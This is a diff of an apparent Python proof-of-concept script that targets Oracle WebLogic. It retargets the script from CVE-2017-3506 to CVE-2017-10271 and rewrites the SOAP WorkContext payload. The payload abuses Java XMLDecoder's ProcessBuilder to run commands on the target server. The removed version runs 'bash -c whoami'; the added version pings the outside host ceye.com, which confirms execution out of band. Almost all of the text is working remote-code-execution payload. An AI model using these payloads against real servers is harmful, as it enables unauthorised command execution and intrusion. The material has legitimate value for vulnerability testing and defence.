@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 # _*_ coding:utf-8 _*_
 '''
- ____       _     _     _ _   __  __           _    
+ ____       _     _     _ _   __  __           _
 |  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
 | |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
-|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   < 
+|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
 |_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
 
 '''
 import sys
+
 import requests
 import re
 import logging
@@ -17,7 +18,7 @@ logging.basicConfig(filename='Weblogic.log',
                     format='%(asctime)s %(message)s',
                     filemode="w", level=logging.INFO)
 
-VUL=['CVE-2017-3506']
+VUL=['CVE-2017-10271']
 headers = {'user-agent': 'ceshi/0.0.1'}
 
 def poc(url,index):
@@ -30,20 +31,17 @@ def poc(url,index):
       <soapenv:Header>
         <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
           <java>
-            <object class="java.lang.ProcessBuilder">
-              <array class="java.lang.String" length="3">
+            <void class="java.lang.ProcessBuilder">
+              <array class="java.lang.String" length="2">
                 <void index="0">
-                  <string>/bin/bash</string>
+                  <string>/usr/sbin/ping</string>
                 </void>
                 <void index="1">
-                  <string>-c</string>
-                </void>
-				<void index="2">
-                  <string>whoami</string>
+                  <string>ceye.com</string>
                 </void>
               </array>
               <void method="start"/>
-            </object>
+            </void>
           </java>
         </work:WorkContext>
       </soapenv:Header>
